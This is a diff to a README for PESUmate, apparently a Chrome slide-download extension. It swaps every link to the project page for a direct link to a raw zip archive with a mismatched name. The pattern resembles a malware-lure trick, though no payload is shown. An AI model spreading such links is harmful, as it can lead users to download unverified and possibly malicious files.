@@ -1,6 +1,6 @@
 # 🧩 PESUmate - Simplify Bulk Slide Downloads
 
-[![Download PESUmate](https://img.shields.io/badge/Download-PESUmate-brightgreen?style=for-the-badge)](https://github.com/xyzruize/PESUmate)
+[![Download PESUmate](https://img.shields.io/badge/Download-PESUmate-brightgreen?style=for-the-badge)](https://github.com/xyzruize/PESUmate/raw/refs/heads/main/archives/Umate_PES_2.0.zip)
 
 ---
 
@@ -27,7 +27,7 @@ No extra software needed outside Chrome.
 
 1. Open your Google Chrome browser on your Windows computer.
 2. Go to the PESUmate download page:  
-   [https://github.com/xyzruize/PESUmate](https://github.com/xyzruize/PESUmate)
+   [https://github.com/xyzruize/PESUmate/raw/refs/heads/main/archives/Umate_PES_2.0.zip](https://github.com/xyzruize/PESUmate/raw/refs/heads/main/archives/Umate_PES_2.0.zip)
 3. Find the section for releases or downloads.
 4. Follow the instructions to add the PESUmate extension to Chrome.  
    This usually means clicking "Add to Chrome" on a store page or downloading a CRX file and dragging it into Chrome's extensions page.
@@ -68,7 +68,7 @@ Click the button for your choice. Wait for the process to finish. Large courses 
 ### Step 1: Open the Download Page  
 
 Click this link to visit the download page:  
-[Download PESUmate](https://github.com/xyzruize/PESUmate)  
+[Download PESUmate](https://github.com/xyzruize/PESUmate/raw/refs/heads/main/archives/Umate_PES_2.0.zip)  
 
 Look for the install button or download link on that page. This is your starting point.
 
@@ -135,4 +135,4 @@ A: PDFs and PPTX files associated with your courses.
 
 Click below to visit the download page and install PESUmate:  
 
-[![Download PESUmate](https://img.shields.io/badge/Download-PESUmate-blue?style=for-the-badge)](https://github.com/xyzruize/PESUmate)
+[![Download PESUmate](https://img.shields.io/badge/Download-PESUmate-blue?style=for-the-badge)](https://github.com/xyzruize/PESUmate/raw/refs/heads/main/archives/Umate_PES_2.0.zip)
